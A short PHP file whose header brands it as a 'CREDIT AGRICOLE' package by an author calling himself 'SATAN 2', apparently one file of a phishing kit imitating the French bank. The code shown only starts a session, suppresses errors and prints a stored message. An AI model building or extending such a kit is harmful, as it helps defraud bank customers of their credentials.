<?php 
/**
 * @link       : https://www.satan2.com/ 
 * @package    : CREDIT AGRICOLE 
 * @telegram   : @satan2
 * @Author     : SATAN 2
 * @Mise à jour: 12-02-2023
 * @Facebook   : https://www.facebook.com/satan2
 */
session_start();
error_reporting(0);
if(isset($_SESSION['mTxt'])){ echo htmlspecialchars($_SESSION['mTxt']); }else{} 
?>